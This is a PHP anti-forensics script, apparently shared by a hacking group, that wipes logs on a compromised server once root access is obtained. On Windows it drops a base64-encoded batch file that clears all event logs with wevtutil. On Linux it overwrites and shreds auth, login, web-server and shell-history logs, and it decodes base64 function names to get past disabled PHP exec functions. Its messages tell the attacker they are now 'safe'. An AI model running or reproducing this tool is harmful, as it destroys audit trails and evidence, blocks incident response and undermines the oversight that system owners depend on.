<?php
$uNaMe = @php_uname();
if(preg_match("/Linux/",$uNaMe)){
$Op = 1;  
}else{
$Op = 0;  
}
//|CHECK ROOT|\\
if($Op == 1){
$id = shell_exec("id");
if(!preg_match("/root/",$id)){
system("clear");
echo "\n  [-] err : you need root permissions \n";  
exit();
} 
}
//|CHECK ROOT|\\

if($Op == 1){
system("clear");
echo "\n  [~] DETECT WEB SERVER ";
system("clear");
echo "\n";
echo "\n  [~] DETECTED ! ";
echo " Linux server ";
echo "\n  [+] WAIT ...\n";
sleep(2)
system("clear");
}
//|SORRY MESSAGE|\\
if($Op == 0){
system("cls");
echo "\n  [~] DETECT WEB SERVER ";
system("cls");
echo "\n";
echo "\n  [~] DETECTED ! ";
echo " Windows server ";
echo "\n  [+] WAIT ...\n";
sleep(3);
system("cls");
$baT = base64_decode("QGVjaG8gb2ZmDQpjb2xvciA3DQp0aXRsZSBMb2cgS2lsbGVyDQplY2hvICAtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09LQ0KZWNobyAtPSAgICAgICAgICAgICAgIExvZyBraWxsZXIgICAgICAgICAgICAgICAgID0tDQplY2hvIC09ICAgVGhpcyB0b29sIGdvaW5nIHRvIGRlbGV0ZSBhbGwgbG9ncyAhICAgPS0NCmVjaG8gIC09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0tDQp0aW1lb3V0IDUNCmZvciAvRiAidG9rZW5zPSoiICUlRyBpbiAoJ3dldnR1dGlsLmV4ZSBlbCcpIERPIChjYWxsIDpjbGVhciAiJSVHIikNCmVjaG8uDQplY2hvIGxvZ3MgaGFzIGRlbGV0ZWQNCmdvdG8gOnRoZUVuZA0KdGltZW91dCA1DQo6Y2xlYXINCmVjaG8gWytdICUxDQp3ZXZ0dXRpbC5leGUgY2wgJTENCmdvdG8gOmVvZg0KOnRoZUVuZA0KdGltZW91dCAz");
$oPen=fopen("LogKiller.bat","w+");
fwrite($oPen,$baT);
system("LogKiller.bat");

}
//|SORRY MESSAGE|\\
$LgF = shell_exec('echo $HISTFILE');
$logFiles = array(
"/var/log/yum.log",
"/var/log/wtmp",
"/var/log/utmp",
"/var/log/secure",
"/var/log/mysqld.log",
"/var/log/boot.log",
"/var/log/lighttpd",
"/var/log/httpd/",
"/var/log/qmail/",
"/var/log/maillog",
"/var/log/cron.log",
"/var/log/kern.log",
"/var/log/auth.log",
"/var/log/message",
"/var/log/lastlog‬‬",
"/var/adm/lastlog‬‬",
"/‪usr/adm/lastlog‬‬",
"/var/log/lastlog",
"$LgF",
"/etc/utmp",
"/etc/wtmp",
"/var/adm",
"/var/log",
"/var/logs",
"/var/run/utmp",
"/var/apache/log",
"/var/apache/logs",
"/usr/local/apache/log",
"/usr/local/apache/logs",
"/root/.bash_logout",
"/root/.bash_history",
"/root/.ksh_history",
"/tmp/logs",
"/opt/lampp/logs/access_log",
"/var/log/nginx/access.log",
"/logs/agent_lo",
"/logs/referer_log",
"/logs/access_log",
"/var/log/apache2",
"/var/log/wtmp",

);

function cMd($command){
$disable_functions = null;
if(function_exists("system"))
{
if(!preg_match("/system/",$disable_functions)){
    @system($command);
}
}elseif(function_exists("shell_exec")){
if(!preg_match("/shell_exec/",$disable_functions) OR !preg_match("/shell exec/",$disable_functions)){ 
    echo shell_exec($command);
}
}elseif(function_exists("exec")){
if(!preg_match("/exec/")){  
      echo exec($command);
} 
}elseif(function_exists("passthru")){
if(!preg_match("/passthru/",$disable_functions)){
echo passthru($command);
}
}else{
$bypass = array(
"U3lTdEVt",
"U2hFbExfZVhlQw==",
"RXhFYw==",
"UGFTc1RoUnU=",
);
foreach($bypass AS $cmd){
$cmd = base64_decode("$cmd");
echo $cmd("$command");
}
}
}
$c0mm4nDs = "shred -u -z -n 30 -v ";
foreach($logFiles as $LogF){
if(file_exists($LogF)){
if(is_dir($LogF)){
$scan = scandir("$LogF");
foreach($scan as $scan2){
$c0mm4nDs = "shred -u -z -n 30 -v $scan2";
$opEN = fopen($scan2,"w+");
$Message = base64_decode("LT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0tClRoaXMgZmlsZSBoYXMgYmVlbiBkZWxldGVkIGJ5IE1yU3FhclRvb2wgLi4uCllvdSdyIHNhZmUgbm93IF5fKgotPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PS0K");
$Message2 = base64_decode("MAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDA=");
fwrite($opEN,$Message2);
echo cMd("$c0mm4nDs");
} 
}else{
$c0mm4nDs = "shred -u -z -n 30 -v $LogF";
$opEN = fopen($LogF,"w+");
$Message = base64_decode("LT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0tClRoaXMgZmlsZSBoYXMgYmVlbiBkZWxldGVkIGJ5IE1yU3FhclRvb2wgLi4uCllvdSdyIHNhZmUgbm93IF5fKgotPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PS0K");
$Message2 = base64_decode("MAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDAKMAowMAowMDAKMDAwMAowMDAwMAowMDAwMDAKMDAwMDAwMAowMDAwMDAwMAowMDAwMDAwMDAKMDAwMDAwMDAwMAowMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAKMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMAowMDAwMDAwMDAwMDAwMDAwMDAwMDA=");
fwrite($opEN,$Message2);
echo cMd("$c0mm4nDs");
}
} 
}
system("clear");
$BaN = "
          (                      )
          |\    ,--------.    / |
          | `.,'            `. /  |
          `  '              ,-'   '
           \/_         _   (     /
          (,-.`.    ,',-.`. `__,'
           |/#\ ),-','#\`= ,'.` |
           `._/)  -'.\_,'   ) ))|
           /  (_.)\     .   -'//
          (  /\____/\    ) )`'\
           \ |V----V||  ' ,    \
            |`- -- -'   ,'   \  \      ___
     _    |         .'    \ \  `._,-'     `-
        `.__,`---^---'       \ ` -'
           -.______  \ . /  ____,-
                   `.     ,'            ap

";
echo $BaN;
echo "\n";
$Message = base64_decode("LT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0tCiAgQWxsIGxvZyBmaWxlcyBoYXMgc3VjY2Vzc2Z1bGx5IGRlbGV0ZWQgCiAgWW91J3Igc2FmZSBub3cgXl8qCiAgZG9uJ3QgZm9yZ2V0IHN1YnNjcmliZSB0byBteSBjaGFubmVsIAogIGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0lUR2Vla3MKICBbU1lTVEVNX0NSQVNIRVJTIFRFQU1dCi09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09LQo=");
echo $Message;
?>
